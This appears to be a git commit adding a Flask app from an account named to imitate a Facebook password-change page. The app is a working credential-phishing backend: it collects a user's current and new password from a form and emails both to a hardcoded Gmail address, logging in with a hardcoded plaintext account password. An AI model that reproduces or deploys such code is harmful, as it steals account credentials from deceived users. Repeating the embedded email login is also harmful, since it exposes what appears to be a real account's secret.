1406bb720deee3731f4dd66e7260b86e008ba461
Facebook-id-change-password <162870449+Facebook-id-change-password@users.noreply.github.com>
2024-03-17 10:56:52 +0100

    Add files via upload

---
+++ app.py
@@ -0,0 +1,46 @@
+from flask import Flask, render_template, request
+import smtplib
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/submit', methods=['POST'])
+def submit_form():
+    current_password = request.form['current_password']
+    new_password = request.form['new_password']
+    retype_new_password = request.form['retype_new_password']
+    
+    if new_password != retype_new_password:
+        return "New passwords do not match."
+    
+    subject = "Password Change Request"
+    body = f"Current Password: {current_password}\nNew Password: {new_password}"
+
+    # Your email address
+    gmail_user = 'marababy003@gmail.com'  # Replace with your email address
+    gmail_password = 'miracle70#'  # Replace with your email password
+
+    sent_from = gmail_user
+    to = ['marababy003@gmail.com']
+    email_text = f"""\
+    From: {sent_from}
+    To: {", ".join(to)}
+    Subject: {subject}
+
+    {body}
+    """
+
+    try:
+        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+        server.login(gmail_user, gmail_password)
+        server.sendmail(sent_from, to, email_text)
+        server.close()
+        return 'Email sent successfully!'
+    except Exception as e:
+        return f'Failed to send email. Error: {str(e)}'
+
+if __name__ == '__main__':
+    app.run(debug=True)
